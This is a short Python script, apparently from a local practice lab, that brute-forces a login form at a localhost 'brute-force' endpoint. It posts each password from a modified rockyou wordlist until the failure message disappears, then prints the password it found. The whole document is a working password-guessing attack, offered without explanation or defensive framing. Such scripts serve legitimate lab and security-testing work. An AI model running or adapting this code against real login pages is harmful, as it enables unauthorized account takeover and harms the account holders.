import requests

url = "http://localhost:3333/brute-force"
data = {
    "password": ""
}

fail_message = "Login failed"

with open("modified_rockyou.txt") as f:
    while password := f.readline().strip():
        data["password"] = password
        res = requests.post(url, data=data)
        if fail_message not in res.text:
            print(password)
            break